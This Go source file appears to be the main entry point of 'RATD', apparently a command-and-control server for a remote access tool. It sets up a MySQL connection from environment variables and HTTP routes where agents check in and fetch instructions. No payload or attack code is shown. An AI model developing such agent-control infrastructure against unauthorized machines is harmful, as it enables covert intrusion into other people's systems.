package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"

	_ "github.com/go-sql-driver/mysql"

	"github.com/julienschmidt/httprouter"
)

func checkError(err error) bool {
	if err != nil {
		log.Print(err)
		return true
	}
	return false
}

type server struct {
	db           *sql.DB
	router       *httprouter.Router
	checkinChan  chan checkin
	agentVersion float64
}

func main() {

	s := &server{agentVersion: .01}

	var err error
	s.db, err = sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(localhost:3308)/%s?parseTime=true", os.Getenv("RATD_MYSQL_USER"), os.Getenv("RATD_MYSQL_PASS"), os.Getenv("RATD_MYSQL_DB_NAME")))
	if checkError(err) {
		return
	}

	s.checkinChan = make(chan checkin, 10)
	s.router = httprouter.New()

	s.router.POST("/checkin/:agentID", s.handleCheckin)
	s.router.GET("/agent/:agentID", s.handleAgentReq)

	go s.checkinProcessor()

	// start webserver
	// accept checkins via cURL

	if err = http.ListenAndServe(":80", s.router); err != nil {
		log.Print(err)
		os.Exit(2)
	}
}
